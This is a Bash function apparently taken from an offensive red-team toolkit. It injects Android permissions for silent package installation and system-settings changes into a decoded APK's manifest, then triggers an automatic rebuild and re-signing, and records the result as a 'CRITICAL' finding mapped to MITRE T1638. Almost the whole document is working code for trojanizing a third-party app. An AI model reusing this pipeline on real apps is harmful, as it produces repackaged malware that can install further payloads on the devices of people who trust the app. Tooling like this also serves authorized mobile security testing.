rt_825_apk_package_inject_final() {
    rt_banner "RT-825" "Silent Package Install and Final Payload"
    if ! is_apk_target || [[ ! -d "$APK_DECODED_DIR" ]]; then return 1; fi
    echo -e "    $CYAN[*] Adding silent install capability...$NC"
    if [[ -f "$APK_DECODED_DIR/AndroidManifest.xml" ]]; then
        # Add REQUEST_INSTALL_PACKAGES
        if ! grep -q "REQUEST_INSTALL_PACKAGES" "$APK_DECODED_DIR/AndroidManifest.xml" 2>/dev/null; then
            sed -i '/<\/manifest>/i\\    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES"/>' "$APK_DECODED_DIR/AndroidManifest.xml" 2>/dev/null
        fi
        # Add WRITE_SETTINGS for system modification
        if ! grep -q "WRITE_SETTINGS" "$APK_DECODED_DIR/AndroidManifest.xml" 2>/dev/null; then
            sed -i '/<\/manifest>/i\\    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>' "$APK_DECODED_DIR/AndroidManifest.xml" 2>/dev/null
        fi
        echo -e "    $GREEN[+] Silent install permissions added$NC"
    fi
    # Trigger rebuild automatically
    echo -e "    $CYAN[*] Triggering automatic rebuild...$NC"
    rt_760_apk_rebuild_sign
    echo -e "    $GREEN[+] APK modification pipeline complete!$NC"
    echo -e "    $GREEN[+] Final APK: $APK_OUTPUT_DIR$NC"
    add_vuln "RT-825" "CRITICAL" "Payload Complete" "Silent install capability added — final modded APK rebuilt" "apk" "full" "MITRE T1638"
}

